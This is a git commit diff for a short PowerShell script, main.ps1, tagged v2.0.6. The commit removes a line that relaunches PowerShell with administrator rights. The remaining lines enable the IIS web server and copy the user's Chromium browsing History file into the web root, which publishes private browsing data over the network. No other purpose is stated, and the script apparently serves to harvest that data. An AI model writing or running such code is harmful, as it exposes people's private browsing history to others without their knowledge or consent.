5ebc851ad03db7eec491409ad934622ddfc8db04
mehmetdere <105990633+mehmetdere@users.noreply.github.com>
2022-09-18 15:38:07 +0300

    v2.0.6

--- main.ps1
+++ main.ps1
@@ -1,4 +1,3 @@
-start-process PowerShell -verb runas 
 DISM /online /enable-feature /featureName:IIS-DefaultDocument /All 
  Copy-Item 'AppData\Local\Chromium\User Data\Default\History' 'C:\inetpub\wwwroot\History File ' 
 cd Downloads
